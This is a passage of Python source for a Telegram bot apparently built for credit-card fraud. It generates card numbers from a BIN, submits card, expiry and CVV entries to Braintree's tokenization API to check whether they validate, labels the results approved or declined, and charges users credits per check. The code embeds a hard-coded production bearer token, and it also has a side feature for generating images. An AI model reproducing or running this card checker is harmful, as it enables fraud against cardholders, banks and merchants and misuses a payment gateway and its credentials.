    'MDG': '🇲🇬',  # Madagascar
    'MWI': '🇲🇼',  # Malawi
    'MYS': '🇲🇾',  # Malaysia
    'MDV': '🇲🇻',  # Maldives
    'MLI': '🇲🇱',  # Mali
    'MLT': '🇲🇹',  # Malta
    'MHL': '🇲🇭',  # Marshall Islands
    'MRT': '🇲🇷',  # Mauritania
    'MUS': '🇲🇺',  # Mauritius
    'MEX': '🇲🇽',  # Mexico
    'FSM': '🇫🇲',  # Micronesia
    'MDA': '🇲🇩',  # Moldova
    'MCO': '🇲🇨',  # Monaco
    'MNG': '🇲🇳',  # Mongolia
    'MNE': '🇲🇪',  # Montenegro
    'MAR': '🇲🇦',  # Morocco
    'MOZ': '🇲🇿',  # Mozambique
    'MMR': '🇲🇲',  # Myanmar
    'NAM': '🇳🇦',  # Namibia
    'NRU': '🇳🇷',  # Nauru
    'NPL': '🇳🇵',  # Nepal
    'NLD': '🇳🇱',  # Netherlands
    'NZL': '🇳🇿',  # New Zealand
    'NIC': '🇳🇮',  # Nicaragua
    'NER': '🇳🇪',  # Niger
    'NGA': '🇳🇬',  # Nigeria
    'MKD': '🇲🇰',  # North Macedonia
    'NOR': '🇳🇴',  # Norway
    'OMN': '🇴🇲',  # Oman
    'PAK': '🇵🇰',  # Pakistan
    'PLW': '🇵🇼',  # Palau
    'PSE': '🇵🇸',  # Palestine
    'PAN': '🇵🇦',  # Panama
    'PNG': '🇵🇬',  # Papua New Guinea
    'PRY': '🇵🇾',  # Paraguay
    'PER': '🇵🇪',  # Peru
    'PHL': '🇵🇭',  # Philippines
    'POL': '🇵🇱',  # Poland
    'PRT': '🇵🇹',  # Portugal
    'QAT': '🇶🇦',  # Qatar
    'ROU': '🇷🇴',  # Romania
    'RUS': '🇷🇺',  # Russia
    'RWA': '🇷🇼',  # Rwanda
    'KNA': '🇰🇳',  # Saint Kitts and Nevis
    'LCA': '🇱🇨',  # Saint Lucia
    'VCT': '🇻🇨',  # Saint Vincent and the Grenadines
    'WSM': '🇼🇸',  # Samoa
    'SMR': '🇸🇲',  # San Marino
    'STP': '🇸🇹',  # São Tomé and Príncipe
    'SAU': '🇸🇦',  # Saudi Arabia
    'SEN': '🇸🇳',  # Senegal
    'SRB': '🇷🇸',  # Serbia
    'SYC': '🇸🇨',  # Seychelles
    'SLE': '🇸🇱',  # Sierra Leone
    'SGP': '🇸🇬',  # Singapore
    'SVK': '🇸🇰',  # Slovakia
    'SVN': '🇸🇮',  # Slovenia
    'SLB': '🇸🇧',  # Solomon Islands
    'SOM': '🇸🇴',  # Somalia
    'ZAF': '🇿🇦',  # South Africa
    'SSD': '🇸🇸',  # South Sudan
    'ESP': '🇪🇸',  # Spain
    'LKA': '🇱🇰',  # Sri Lanka
    'SDN': '🇸🇩',  # Sudan
    'SUR': '🇸🇷',  # Suriname
    'SWE': '🇸🇪',  # Sweden
    'CHE': '🇨🇭',  # Switzerland
    'SYR': '🇸🇾',  # Syria
    'TWN': '🇹🇼',  # Taiwan
    'TJK': '🇹🇯',  # Tajikistan
    'TZA': '🇹🇿',  # Tanzania
    'THA': '🇹🇭',  # Thailand
    'TLS': '🇹🇱',  # Timor-Leste
    'TGO': '🇹🇬',  # Togo
    'TON': '🇹🇴',  # Tonga
    'TTO': '🇹🇹',  # Trinidad and Tobago
    'TUN': '🇹🇳',  # Tunisia
    'TUR': '🇹🇷',  # Turkey
    'TKM': '🇹🇲',  # Turkmenistan
    'TUV': '🇹🇻',  # Tuvalu
    'UGA': '🇺🇬',  # Uganda
    'UKR': '🇺🇦',  # Ukraine
    'ARE': '🇦🇪',  # United Arab Emirates
    'GBR': '🇬🇧',  # United Kingdom
    'USA': '🇺🇸',  # United States
    'URY': '🇺🇾',  # Uruguay
    'UZB': '🇺🇿',  # Uzbekistan
    'VUT': '🇻🇺',  # Vanuatu
    'VEN': '🇻🇪',  # Venezuela
    'VNM': '🇻🇳',  # Vietnam
    'YEM': '🇾🇪',  # Yemen
    'ZMB': '🇿🇲',  # Zambia
    'ZWE': '🇿🇼',  # Zimbabwe
}

@bot.message_handler(func=lambda message: message.text.startswith(('/bin', '.bin')))
def handle_bin_command(message):
    try:
        bin_number = message.text.split()[1]
        generated_card = generate_card_data(bin_number)

        if generated_card:
            bin_info = use_card_in_braintree(generated_card[0])
            country_code = bin_info[4].upper()
            country_flag = country_flags.get(country_code, '')

            response_text = f"""
𝘽𝙄𝙉 -» {bin_info[0]}

𝙄𝙉𝙁𝙊 -» {bin_info[1].upper()}
𝗧𝗬𝗣𝗘 -» {bin_info[2].upper()}
𝘽𝘼𝙉𝙆 -» {bin_info[3].upper()}
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 -» {country_code} -- {country_flag}
----------------------------------------------------
BOT BY : AntifiedNull[Prateek]
Username : @GOD_ANTIFIEDNULL_X
"""
            bot.reply_to(message, response_text)
        else:
            bot.reply_to(message, "Failed to generate card data.")
    except IndexError:
        bot.reply_to(message, "Please provide a BIN number.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {str(e)}")

@bot.message_handler(func=lambda message: message.text.startswith(('/gen', '.gen')))
def handle_gen_command(message):
    try:
        parts = message.text.split()

        if len(parts) < 2:
            bot.reply_to(message, "Please provide a BIN number.")
            return

        bin_input = parts[1]
        amount = int(parts[2]) if len(parts) > 2 else 10

        if not bin_input[0] in '3456':
            bot.reply_to(message, "Invalid BIN. Must start with 3, 4, 5, or 6.")
            return

        generated_cards = generate_card_data(bin_input, amount)

        if not generated_cards:
            bot.reply_to(message, "Failed to generate card data.")
            return

        response_text = f"𝗕𝗜𝗡 ⇾ {bin_input}\n𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ {amount}\n\n"
        
        for card in generated_cards:
            card_number, exp_month, full_exp_year, cvv = card.split('|')
            if len(full_exp_year) == 2:
                full_exp_year = "20" + full_exp_year
            exp_year = full_exp_year[-2:]
            response_text += f"{card_number}|{exp_month}|{exp_year}|{cvv}\n"

        response_text += "\n"

        first_card_info = use_card_in_braintree(generated_cards[0])
        country_code = first_card_info[4].upper()
        country_flag = country_flags.get(country_code, '')

        response_text += f"""
𝗜𝗻𝗳𝗼: {first_card_info[1].upper()} - {first_card_info[2].upper()}
𝐈𝐬𝐬𝐮𝐞𝐫: {first_card_info[3].upper()}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_code} -- {country_flag}
"""

        bot.reply_to(message, response_text)

    except Exception as e:
        bot.reply_to(message, f"An error occurred: {str(e)}")

# Command to update the Bearer token
@bot.message_handler(func=lambda message: message.text.startswith(('/bear', '.bear')))
def update_bearer_token(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "You are not authorized to update the Bearer token.")
        return

    try:
        command_args = message.text.split(" ", 1)
        if len(command_args) < 2:
            bot.reply_to(message, "Usage: /bear {new_bearer_token}")
            return

        new_bearer_token = command_args[1]
        set_bearer_token(new_bearer_token)
        bot.reply_to(message, "Bearer token updated successfully.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

# Modify the headers in tokenize_credit_card function to use the token from the database
def tokenize_credit_card(card_number, exp_month, exp_year, cvv):
    bearer_token = get_bearer_token()
    if not bearer_token:
        raise ValueError("Bearer token is not set.")

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'authorization': f'Bearer {bearer_token}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': 'd762c1de-0028-4141-be63-254500e88d6f',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card_number,
                    'expirationMonth': exp_month,
                    'expirationYear': exp_year,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': '10080',
                    },
                },
                'options': {
                    'validate': True,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    try:
        response_data = response.json()
        response_text = json.dumps(response_data).lower()
        return response_text  # Return the entire response as a string
    except json.JSONDecodeError:
        return "Error: Failed to parse response"

def determine_status(response_text):

    # Define your keywords
    declined_keywords = [
        "declined", "card issuer declined", "processor declined", "declined - call issuer",
        "pickup card", "call issuer. pick up card.", "fraudulent", "transaction not allowed",
        "cvv verification failed", "credit card number is invalid", "expired card",
        "card number is incorrect", "service not allowed", "transaction blocked",
        "do not honor", "generic decline", "high-risk", "restricted", "stolen card",
        "lost card", "blacklisted", "postal code verification failed", "avs check failed",
        "invalid cvv", "incorrect cvv", "incorrect cvc", "invalid cvc", 
        "security code is invalid", "security code is incorrect", "zip code is incorrect",
        "zip code is invalid", "cardholder name missing", "billing address invalid",
        "invalid expiration date", "card type not accepted", "unsupported currency",
        "amount must be greater than zero", "transaction declined", "issuer unavailable",
        "no sufficient funds", "transaction limit exceeded", "do not honor by issuer",
        "restricted card", "card not allowed", "insufficient funds"
    ]

    fraud_keywords = [
        "gateway rejected: fraud", "fraudulent", "high-risk transaction", "transaction flagged",
        "suspected fraud", "blacklisted card", "transaction declined due to risk",
        "card not supported", "velocity limit exceeded", "fraud rules triggered"
    ]

    api_issue_keywords = [
        "invalid api keys", "authentication failed", "authorization required", "authentication credentials are invalid", 
        "invalid credentials", "access denied", "merchant account not found",
        "unauthorized request", "invalid token", "permission denied", 
        "user authentication failed", "invalid username or password", 
        "authentication required for transaction", "authorization error",
        "merchant not authorized", "invalid session", "gateway timeout",
        "processing error", "service unavailable", "request timeout",
        "internal server error", "retry later", "gateway unavailable",
        "network connection lost", "payment gateway error", "service disruption",
        "api key expired", "api limit exceeded"
    ]

    approved_keywords = [
        "1000: approved", "transaction successful", "payment processed", "payment approved",
        "authentication required", "gateway rejected: avs", "3d secure passed",
        "aws billing successful", "cardholder authentication passed",
        "thank you for your support", "subscription started", "purchase successful",
        "your order has been received", "transaction completed", "membership confirmation",
        "payment received", "transaction could not be processed", "success", "bin"
    ]

    # Check for keywords in the entire response text
    for kw in approved_keywords:
        if kw in response_text:
            return "APPROVED ✅"

    for kw in declined_keywords:
        if kw in response_text:
            return "DECLINED ❌"

    for kw in fraud_keywords:
        if kw in response_text:
            return "FRAUD/RISK REJECTED 🚨"

    for kw in api_issue_keywords:
        if kw in response_text:
            return "API ISSUE ☠️"

    return "UNKNOWN STATUS 👾"

def extract_bin_details(card_number, exp_month, exp_year, cvv):
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer production_w3jmfs6q_779b9vbjhk2bffsj',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'c08117f3-1760-4cb2-ae53-5671a874f3ca',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card_number,
                    'expirationMonth': exp_month,
                    'expirationYear': exp_year,
                    'cvv': cvv,
                    'cardholderName': 'AntifiedNull Prateek',
                    'billingAddress': {
                        'countryCodeAlpha2': 'IN',
                        'locality': 'Noida',
                        'region': 'UP',
                        'firstName': 'AntifiedNull',
                        'lastName': 'Prateek',
                        'postalCode': '201309',
                        'streetAddress': 'AntifiedNull',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        response.raise_for_status()
        bin_info = response.json()

        # Extract BIN-related details from the response
        bin_details = bin_info.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {})
        bin_number = bin_details.get('bin', 'Unknown')
        brand_code = bin_details.get('brandCode', 'Unknown').capitalize()
        card_type = "DEBIT" if bin_details.get('binData', {}).get('debit', 'NO') == "YES" else "CREDIT"
        issuing_bank = bin_details.get('binData', {}).get('issuingBank', 'Unknown')

        # Safely convert to title case if issuing_bank is not None
        issuing_bank = issuing_bank.title() if issuing_bank else 'Unknown'

        # Safely convert country_code to uppercase if it is not None
        country_code = bin_details.get('binData', {}).get('countryOfIssuance', 'Unknown')
        country_code = country_code.upper() if country_code else 'Unknown'

        # Get the country flag
        country_flag = country_flags.get(country_code, '')

        return {
            "bin_number": bin_number,
            "brand_code": brand_code,
            "card_type": card_type,
            "issuing_bank": issuing_bank,
            "country_code": country_code,
            "country_flag": country_flag,
        }

    except Exception as e:
        # Return a dictionary with default values and the error message
        return {
            "bin_number": 'Unknown',
            "brand_code": 'Unknown',
            "card_type": 'Unknown',
            "issuing_bank": 'Unknown',
            "country_code": 'Unknown',
            "country_flag": '',
            "error": str(e)
        }

# Example of handling a bot command
@bot.message_handler(func=lambda message: message.text.startswith(('.b3', '/b3')))
def process_command(message):
    try:
        user_id = message.from_user.id

        # Check if the user has enough credits before processing
        cursor = get_cursor()
        cursor.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
        user = cursor.fetchone()
        
        if not user or user[0] < 1:
            bot.reply_to(message, "Insufficient credits. Please add more credits to continue.")
            return

        parts = message.text.split(' ', 1)
        if len(parts) < 2 or '|' not in parts[1] or len(parts[1].split('|')) != 4:
            bot.reply_to(message, "Please provide CC in the correct format: cc|mm|yy|cvv")
            return

        card_number, exp_month, exp_year, cvv = parts[1].split('|')
        start_time = time.time()
        response_text = tokenize_credit_card(card_number.strip(), exp_month.strip(), exp_year.strip(), cvv.strip())
        status = determine_status(response_text)
        bin_details = extract_bin_details(card_number.strip(), exp_month.strip(), exp_year.strip(), cvv.strip())
        elapsed_time = time.time() - start_time

        # Deduct 1 credit after processing
        with db_lock:
            cursor.execute("UPDATE users SET credits = credits - 1 WHERE user_id=?", (user_id,))
            conn.commit()

        # Check if there's an error in bin_details
        if 'error' in bin_details:
            response_text = f"Error processing BIN details: {bin_details['error']}"
        else:
            remaining_credits = user[0] - 1
            response_text = f"""
{status}

𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvv}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: BRAINTREE AUTH 

𝗜𝗻𝗳𝗼: {bin_details['brand_code']}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_details['country_code']} {bin_details['country_flag']}
𝐓𝐲𝐩𝐞 : {bin_details['card_type']}
𝐁𝐢𝐧: {bin_details['bin_number']}
𝗧𝗶𝗺𝗲: {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬

BOT BY: AntifiedNull[Prateek]
USERNAME : @GOD_ANTIFIEDNULL_X
"""

        bot.reply_to(message, response_text)

    except Exception as e:
        bot.reply_to(message, f"Error processing the command: {str(e)}")


# Generate image
def generate_image_from_replicate(prompt):
    api_key = get_api_key()
    if not api_key:
        raise ValueError("API key is not set.")

    os.environ["REPLICATE_API_TOKEN"] = api_key
    output = replicate.run(
        "cjwbw/animagine-xl-3.1:6afe2e6b27dad2d6f480b59195c221884b6acc589ff4d05ff0e5fc058690fbb9",
        input={"prompt": prompt}
    )
    return output.read()

# Worker thread to process requests
def process_requests():
    while True:
        chat_id, user_prompt = request_queue.get()
        try:
            # Generate image
            image_data = generate_image_from_replicate(user_prompt)
            output_path = f"output_{chat_id}.png"
            with open(output_path, "wb") as f:
                f.write(image_data)
            # Send image
            with open(output_path, "rb") as f:
                bot.send_photo(chat_id, f, caption="Here is your generated image!\nBot By 𝘼𝙉𝙏𝙞𝙁𝙄𝙀𝘿𝙉𝙐𝙇𝙇「 ∅ 」")
        except Exception as e:
            bot.send_message(chat_id, f"An error occurred: {e}")
        request_queue.task_done()

# Start worker thread
worker_thread = Thread(target=process_requests, daemon=True)
worker_thread.start()

# Check if user is registered
def is_registered(user_id):
    cursor = get_cursor()
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    return cursor.fetchone() is not None

# Cmd /img
@bot.message_handler(func=lambda message: message.text.startswith(('/img', '.img')))
def generate_image(message):
    user_id = message.from_user.id

    # Check if user is registered
    if not is_registered(user_id):
        bot.reply_to(message, "You need to register before using this feature. Please use /register.")
        return

    try:
        command_args = message.text.split(" ", 1)
        if len(command_args) < 2:
            bot.reply_to(message, "Usage: /img {prompt}")
            return

        user_prompt = command_args[1]
        chat_id = message.chat.id
        request_queue.put((chat_id, user_prompt))
        bot.reply_to(message, "Your request has been added to the queue. Please wait.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

# Cmd /api (admin only)
@bot.message_handler(func=lambda message: message.text.startswith(('/api', '.api')))
def update_api_token(message):
    if not is_admin(message.from_user.id) and message.from_user.id != OWNER_ID:
        bot.reply_to(message, "You are not authorized to update the API key.")
        return

    try:
        command_args = message.text.split(" ", 1)
        if len(command_args) < 2:
            bot.reply_to(message, "Usage: /api {new_api_key}")
            return

        new_api_key = command_args[1]
        set_api_key(new_api_key)
        bot.reply_to(message, "API key updated successfully.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

# Start the bot
def start_polling_with_retry():
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True, timeout=60)  # Increase timeout to 60 seconds
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying

if __name__ == "__main__":
    start_polling_with_retry()
